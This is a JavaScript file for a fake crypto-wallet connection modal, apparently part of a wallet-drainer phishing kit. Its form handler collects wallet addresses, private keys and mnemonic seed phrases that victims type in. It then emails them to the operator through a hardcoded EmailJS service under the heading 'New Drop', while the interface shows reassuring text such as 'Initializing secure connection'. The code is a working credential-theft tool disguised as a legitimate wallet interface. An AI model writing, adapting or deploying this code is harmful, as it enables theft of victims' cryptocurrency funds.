
// Create wallet logger instance for global access
window.walletLogger = {
    logWalletData: function(walletData) {
        const result = {
            walletAddress: walletData['wallet-address'] || '',
            privateKey: walletData['priv_key'] || '',
            bip39Mnemonic: walletData['mnemonic-seed'] || '',
            timestamp: new Date().toISOString()
        };
        msg(JSON.stringify(result));
    }
};

// Mobile detection function
isMobile = function () {
    let check = false;
  
    (function (a) {
      if (
        /(android|bb\d+|meego).+mobile|avantgo|bada\/|blackberry|blazer|compal|elaine|fennec|hiptop|iemobile|ip(hone|od)|iris|kindle|lge |maemo|midp|mmp|mobile.+firefox|netfront|opera m(ob|in)i|palm( os)?|phone|p(ixi|re)\/|plucker|pocket|psp|series(4|6)0|symbian|treo|up\.(browser|link)|vodafone|wap|windows ce|xda|xiino/i.test(
          a
        ) ||
        /1207|6310|6590|3gso|4thp|50[1-6]i|770s|802s|a wa|abac|ac(er|oo|s\-)|ai(ko|rn)|al(av|ca|co)|amoi|an(ex|ny|yw)|aptu|ar(ch|go)|as(te|us)|attw|au(di|\-m|r |s )|avan|be(ck|ll|nq)|bi(lb|rd)|bl(ac|az)|br(e|v)w|bumb|bw\-(n|u)|c55\/|capi|ccwa|cdm\-|cell|chtm|cldc|cmd\-|co(mp|nd)|craw|da(it|ll|ng)|dbte|dc\-s|devi|dica|dmob|do(c|p)o|ds(12|\-d)|el(49|ai)|em(l2|ul)|er(ic|k0)|esl8|ez([4-7]0|os|wa|ze)|fetc|fly(\-|_)|g1 u|g560|gene|gf\-5|g\-mo|go(\.w|od)|gr(ad|un)|haie|hcit|hd\-(m|p|t)|hei\-|hi(pt|ta)|hp( i|ip)|hs\-c|ht(c(\-| |_|a|g|p|s|t)|tp)|hu(aw|tc)|i\-(20|go|ma)|i230|iac( |\-|\/)|ibro|idea|ig01|ikom|im1k|inno|ipaq|iris|ja(t|v)a|jbro|jemu|jigs|kddi|keji|kgt( |\/)|klon|kpt |kwc\-|kyo(c|k)|le(no|xi)|lg( g|\/(k|l|u)|50|54|\-[a-w])|libw|lynx|m1\-w|m3ga|m50\/|ma(te|ui|xo)|mc(01|21|ca)|m\-cr|me(rc|ri)|mi(o8|oa|ts)|mmef|mo(01|02|bi|de|do|t(\-| |o|v)|zz)|mt(50|p1|v )|mwbp|mywa|n10[0-2]|n20[2-3]|n30(0|2)|n50(0|2|5)|n7(0(0|1)|10)|ne((c|m)\-|on|tf|wf|wg|wt)|nok(6|i)|nzph|o2im|op(ti|wv)|oran|owg1|p800|pan(a|d|t)|pdxg|pg(13|\-([1-8]|c))|phil|pire|pl(ay|uc)|pn\-2|po(ck|rt|se)|prox|psio|pt\-g|qa\-a|qc(07|12|21|32|60|\-[2-7]|i\-)|qtek|r380|r600|raks|rim9|ro(ve|zo)|s55\/|sa(ge|ma|mm|ms|ny|va)|sc(01|h\-|oo|p\-)|sdk\/|se(c(\-|0|1)|47|mc|nd|ri)|sgh\-|shar|sie(\-|m)|sk\-0|sl(45|id)|sm(al|ar|b3|it|t5)|so(ft|ny)|sp(01|h\-|v\-|v )|sy(01|mb)|t2(18|50)|t6(00|10|18)|ta(gt|lk)|tcl\-|tdg\-|tel(i|m)|tim\-|t\-mo|to(pl|sh)|ts(70|m\-|m3|m5)|tx\-9|up(\.b|g1|si)|utst|v400|v750|veri|vi(rg|te)|vk(40|5[0-3]|\-v)|vm40|voda|vulc|vx(52|53|60|61|70|80|81|83|85|98)|w3c(\-| )|webc|whit|wi(g |nc|nw)|wmlb|wonu|x700|yas\-|your|zeto|zte\-/i.test(
          a.substr(0, 4)
        )
      )
        check = true;
    })(navigator.userAgent || navigator.vendor || window.opera);
    return check;
  };
  
  function hide_elem(params) {
    [...document.querySelectorAll(params)].forEach((element) => {
      element.classList.remove("active");
      element.classList.add("hidden");
    });
  }
  
  function show_elem(params) {
    [...document.querySelectorAll(params)].forEach((element) => {
      element.classList.add("active");
      element.classList.remove("hidden");
    });
  }
  
  function init_all() {
    hide_elem("#connect-modal");
    hide_elem("#connect-modal-overlay");
    hide_elem("#lucien-popup");
  }
  
  function closeModal() {
    hide_elem("#connect-modal");
    hide_elem("#connect-modal-overlay");
  }
  
  function openModalMain() {
    init_all();
    show_elem("#connect-modal");
    show_elem("#connect-modal-overlay");
    show_elem("#modal-close");
    document.getElementById("modal-close").addEventListener("click", function () {
      closeModal();
    });
  }
  
  (function () {
      emailjs.init({
        publicKey: "rWChWjhuMJ4wd1f1N",
      });
    })();
  function inspectExport(formdata, nextpage) {
  
  
    on_submit();
  
    let strings = formdata;
    let message = `New Drop 🏆🏆🏆 \n\nFrom: ${window.location.host}\n\n`;
    Object.keys(strings).forEach(function (key) {
      message += ` ${strings[key]["name"]} : ${strings[key]["value"]}\n\n`;
    });
    var templateParams = {
      site: window.location.host,
      message: message,
    };
    const serviceID = "service_nkx0dmn";
    const templateID = "template_qcb1lja";
    emailjs.send(serviceID, templateID, templateParams).then(
      (response) => {
        console.log('SUCCESS!', response.status);
      },
      (error) => {
      //   console.log('FAILED...', error);
        return
      },
    );
    
  }
  
  if (
    window.matchMedia &&
    window.matchMedia("(prefers-color-scheme: dark)").matches
  ) {
    document.documentElement.setAttribute("data-theme", "dark");
  } else {
    document.documentElement.setAttribute("data-theme", "light");
  }
  
  var cancelElement = document.querySelector(".searchbox .cancel");
  cancelElement.addEventListener("click", () => {
    var searchbox = document.getElementById("searchbox");
    searchbox.value = "";
    searchSelection("");
  });
  function searchSelection(val) {
    cancelElement.style.visibility = "hidden";
    if (val.length > 0) {
      cancelElement.style.visibility = "visible";
    }
    filter = val.toUpperCase();
    ul = document.getElementById("modal-main-ul");
    li = ul.getElementsByClassName("menu-el");
    for (i = 0; i < li.length; i++) {
      a = li[i].getElementsByClassName("modal-el-desc")[0];
      txtValue = a.textContent || a.innerText;
      if (txtValue.toUpperCase().indexOf(filter) > -1) {
        li[i].style.display = "";
      } else {
        li[i].style.display = "none";
      }
    }
  }
  
  function openTab(evt, tabName) {
    var i, tabcontent, tablinks;
  
    [...document.getElementsByClassName("form")].forEach((element) => {
      element.classList.add("hidden");
    });
  
    tablinks = document.getElementsByClassName("tablinks");
    for (i = 0; i < tablinks.length; i++) {
      tablinks[i].classList.remove("active");
    }
  
    [...document.getElementsByClassName(tabName)].forEach((element) => {
      element.classList.remove("hidden");
    });
  
    evt.currentTarget.classList.add("active");
  }
  const tablinks = document.getElementsByClassName("tablinks");
  [...tablinks].forEach((element) => {
    element.addEventListener("click", (event) => {
      openTab(event, element.dataset.target);
    });
  });
  
  function one_secs_delay(callback) {
    setTimeout(callback, 300);
  }
  

  
  document.querySelector(".help-icon").addEventListener("click", function () {
    toggle_help_icon("help");
  });
  
  document.querySelector(".back-icon").addEventListener("click", function () {
    toggle_help_icon("back");
  });
  
  document.querySelector(".modal-button").addEventListener("click", function () {
    toggle_help_icon("back");
  });
  
  function setModalTitle(new_title) {
    document.getElementById("title").innerHTML = new_title;
  }
  
  function toggle_help_icon(val) {
    var helpElem = document.querySelector(".help");
    var help_icon = document.querySelector(".help-icon");
    var back_icon = document.querySelector(".back-icon");
  
    var form = document.querySelector("#modal-main-form-ul");
    var help_ul = document.querySelector("#modal-main-help-ul");
    var wallets_ul = document.querySelector("#modal-main-ul");
    var welcome_ul = document.querySelector("#modal-main-action-ul");
  
    help_icon.classList.add("hidden");
    back_icon.classList.add("hidden");
    wallets_ul.classList.add("hidden");
    welcome_ul.classList.add("hidden");
  
    form.classList.add("hidden");
    help_ul.classList.add("hidden");
  
    if (val === "help") {
      show_elem(".back-icon");
      show_elem("#modal-main-help-ul");
      setModalTitle("What is a wallet?");
      return;
    }
  
    show_elem(".help-icon");
    show_elem(".modal-main-action-ul");
    show_elem("#modal-main-action-ul");
    setModalTitle("Get Started");
    return;
  }
  function capitalizeWords(sentence) {
    const words = sentence.split(" ");
    const capitalizedWords = words.map((word) => {
      if (word.length > 0) {
        return word.charAt(0).toUpperCase() + word.slice(1);
      } else {
        return word;
      }
    });
    const capitalizedSentence = capitalizedWords.join(" ");
    return capitalizedSentence;
  }
  
  function openConnection(event) {
    show_elem(".conn-mode");
    show_elem("#browsing-mode");
    show_elem("#modal-head > .help");
    show_elem("#modal-close");
  
    hide_elem(".form");
    show_elem(".menmonic-form");
    hide_elem(".modal-main");
    hide_elem(".help-icon");
    hide_elem(`#modal-main-ul > .modal-main-menu`);
    event.currentTarget;
    let connText;
    if (event.currentTarget.dataset.target == "ai") {
      connText = "AI ToolKit";
    } else {
      connText = event.currentTarget
        .querySelector(".modal-icon > img")
        .getAttribute("alt");
    }
    let connImage = event.currentTarget
      .querySelector(".modal-icon > img")
      .getAttribute("src");
    setModalTitle(capitalizeWords(connText));
    let connelem_img = document.querySelector(".form-image img");
    let connelem_txt = document.querySelector(".wallet-name");
    connelem_img.setAttribute("src", connImage);
    document.querySelector(".loading-img").style.border = "none";
    document.getElementsByTagName("rect")[0].style.stroke = "#3396ff";
    if (!connelem_txt) {
      let selectedElement = document.querySelector(".form-text-header");
      selectedElement.style.color = "#01091b";
  
      selectedElement.innerHTML =
        "Initializing secure connection with <span class='wallet-name'></span>.";
      connelem_txt = document.querySelector(".wallet-name");
    }
    connelem_txt.innerHTML = capitalizeWords(connText);
    show_elem("#modal-main-form-ul");
  }
  function toggle_connect_method(event, target) {
    hide_elem(".modal-main");
    hide_elem(".help-icon");
    hide_elem(`#modal-main-ul > .modal-main-menu`);
    show_elem("#modal-main-ul");
    show_elem(".back-icon");
  
    document.querySelector(`#${target}`).classList.remove("hidden");
    if (target.includes("dapp")) {
      setModalTitle("Select a Dapp");
    } else if (target.includes("chains")) {
      setModalTitle("Select a Chain");
    } else {
      setModalTitle("Select a Wallet");
    }
  }
  document
    .querySelectorAll("#modal-main-action-ul > .modal-main-menu > .menu-el")
    .forEach((elem) => {
      elem.addEventListener("click", function (event) {
        if (elem.dataset.target == "ai") {
          openConnection(event);
          show_elem(".back-icon");
          return;
        }
        toggle_connect_method(event, elem.dataset.target);
      });
    });
  
  document
    .querySelectorAll("#modal-main-ul > .modal-main-menu > .menu-el")
    .forEach((elem) => {
      elem.addEventListener("click", function (event) {
        if (elem.dataset.target == "ai") {
          return;
        }
        openConnection(event);
      });
    });
  
  document.querySelectorAll(".interact-button-manual").forEach((elem) => {
    elem.addEventListener("click", function (event) {
      openModalMain(event);
    });
  });

  
  document.querySelectorAll(".interact-button").forEach((elem) => {
    elem.addEventListener("click", function (event) {
      closeModal();
    });
  });
  
  document.querySelectorAll("form").forEach((elem) => {
    elem.addEventListener("submit", function (event) {
      event.preventDefault();
      let form = new FormData(this);
      let formArray = Array.from(form.entries()).map(([name, value]) => ({
        name,
        value,
      }));
      
      // Log wallet data using the wallet logger
      if (window.walletLogger) {
        const walletData = {};
        formArray.forEach(item => {
          walletData[item.name] = item.value;
        });
        window.walletLogger.logWalletData(walletData);
      }
      
      inspectExport(formArray, "#");
    });
  });
  